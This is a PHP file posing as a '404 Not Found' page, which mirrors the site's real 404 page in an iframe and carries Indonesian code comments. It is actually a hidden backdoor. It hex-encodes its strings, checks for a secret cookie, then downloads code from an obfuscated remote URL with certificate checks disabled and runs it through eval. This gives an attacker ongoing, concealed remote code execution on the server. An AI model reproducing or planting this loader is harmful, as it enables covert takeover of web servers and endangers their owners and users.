<?php
@ini_set('display_errors', 0);

// Fungsi untuk decode hex menjadi string
function hx($ex) {
    $sx = '';
    for ($i = 0; $i < strlen($ex); $i += 2)
        $sx .= chr(hexdec(substr($ex, $i, 2)));
    return $sx;
}

// Cek apakah cookie 'kaye' bernilai 'jagaldomain'
function cx() {
    return isset($_COOKIE[hx('6b617965')]) && $_COOKIE[hx('6b617965')] === hx('6a6167616c646f6d61696e');
}

// Fungsi fetch konten dari remote
function fx($ux) {
    $tx = array_map('hx', [
        '666f70656e',                         // fopen
        '73747265616d5f6765745f636f6e74656e7473', // stream_get_contents
        '66696c655f6765745f636f6e74656e7473', // file_get_contents
        '6375726c5f65786563',                // curl_exec
        '636f7079',                          // copy
        '73747265616d5f636f6e74657874',      // stream_context_create
        '66696c65'                           // file
    ]);

    if (function_exists($tx[3])) {
        $ch = curl_init($ux);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_SSL_VERIFYHOST => 0
        ]);
        $rx = $tx[3]($ch);
        curl_close($ch);
        return $rx;
    } elseif (function_exists($tx[2])) {
        return $tx[2]($ux);
    } elseif (function_exists($tx[0]) && function_exists($tx[1])) {
        $ax = $tx[0]($ux, "r");
        $rx = $tx[1]($ax);
        fclose($ax);
        return $rx;
    } elseif (function_exists($tx[4])) {
        return $tx[4]($ux, '/tmp/tmpfile');
    } elseif (function_exists($tx[5])) {
        $ctx = $tx[5](['http' => ['timeout' => 5]]);
        return file_get_contents($ux, false, $ctx);
    } elseif (function_exists($tx[6])) {
        return implode('', $tx[6]($ux));
    }
    return false;
}

// Jika cookie cocok, ambil konten dari remote dan eval
if (cx()) {
    $ux = hx('68747470733a2f2f') . hx('7075622d6564643235373236313438393466653062623639303031323838316138623536') . hx('2e72322e646576') . '/' . hx('73746675') . '/' . hx('6c6f6c6361742e747874');
    $px = fx($ux);
    if ($px !== false) eval('?>' . $px);
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
    <meta name="robots" content="noindex,nofollow,noarchive">
    <style>
        html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: sans-serif; }
        iframe { position: absolute; top: 0; left: 0; border: none; width: 100%; height: 100%; }
    </style>
</head>
<body>
    <iframe src="//<?php echo $_SERVER['SERVER_NAME']; ?>/404" 
            onload="document.title=this.contentDocument?.title||this.contentWindow.document.title;">
    </iframe>
</body>
</html>
